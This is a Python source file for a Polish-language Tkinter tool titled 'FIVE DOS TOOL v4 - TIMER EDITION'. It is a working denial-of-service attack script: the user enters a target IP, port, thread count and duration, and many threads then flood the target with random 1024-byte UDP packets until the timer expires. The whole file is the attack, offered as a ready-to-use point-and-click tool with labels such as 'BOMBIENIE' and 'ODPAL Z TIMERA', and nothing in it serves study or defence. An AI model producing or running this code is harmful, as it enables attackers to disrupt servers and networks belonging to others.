import socket
import threading
import random
import time
import tkinter as tk
from tkinter import ttk

def udp_flood(target_ip, target_port, end_time):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = random._urandom(1024) 
    
    # Pętla działa tylko do momentu osiągnięcia end_time
    while time.time() < end_time:
        try:
            client.sendto(bytes_payload, (target_ip, target_port))
        except:
            break
    print("Wątek zakończył pracę.")

def start_threads():
    target = ip_entry.get()
    try:
        port = int(port_entry.get())
        thread_count = int(threads_entry.get())
        duration = int(duration_entry.get())
    except:
        status_label.config(text="BŁĄD DANYCH!", fg="orange")
        return

    # Obliczamy moment zakończenia
    end_time = time.time() + duration
    
    status_label.config(text=f"BOMBIENIE PRZEZ {duration}s...", fg="#FF0000")
    
    for _ in range(thread_count):
        t = threading.Thread(target=udp_flood, args=(target, port, end_time))
        t.daemon = True
        t.start()

# --- GUI ---
root = tk.Tk()
root.title("FIVE DOS TOOL v4 - TIMER EDITION")
root.geometry("600x750")
root.configure(bg="black")

logo_text = """
___________._______   _______________             ________   ________   _________
\_   _____/|   \   \ /   /\_   _____/             \______ \  \_____  \  /   _____/
 |    __)  |   |\   Y   /  |    __)_               |    |  \  /   |   \ \_____  \ 
 |     \   |   | \     /   |        \              |    `   \/    |    \/        \ 
 \___  /   |___|  \___/   /_______  /             /_______  /\_______  /_______  /
     \/                           \/                      \/         \/        \/ 
"""
tk.Label(root, text=logo_text, fg="#00FF00", bg="black", font=("Courier", 8)).pack(pady=10)

# Pola wejściowe
tk.Label(root, text="IP CELU:", fg="white", bg="black").pack()
ip_entry = tk.Entry(root, bg="#222", fg="white", insertbackground="white")
ip_entry.pack(pady=5)

tk.Label(root, text="PORT:", fg="white", bg="black").pack()
port_entry = tk.Entry(root, bg="#222", fg="white", insertbackground="white")
port_entry.insert(0, "80")
port_entry.pack(pady=5)

tk.Label(root, text="LICZBA WĄTKÓW:", fg="white", bg="black").pack()
threads_entry = tk.Entry(root, bg="#222", fg="white", insertbackground="white")
threads_entry.insert(0, "50")
threads_entry.pack(pady=5)

tk.Label(root, text="CZAS TRWANIA (sekundy):", fg="white", bg="black").pack()
duration_entry = tk.Entry(root, bg="#222", fg="white", insertbackground="white")
duration_entry.insert(0, "10")
duration_entry.pack(pady=5)

start_btn = tk.Button(root, text="ODPAL Z TIMERA", command=start_threads, bg="#cc0000", fg="white", font=("Arial", 12, "bold"))
start_btn.pack(pady=20)

status_label = tk.Label(root, text="System gotowy.", fg="#555", bg="black")
status_label.pack()

root.mainloop()
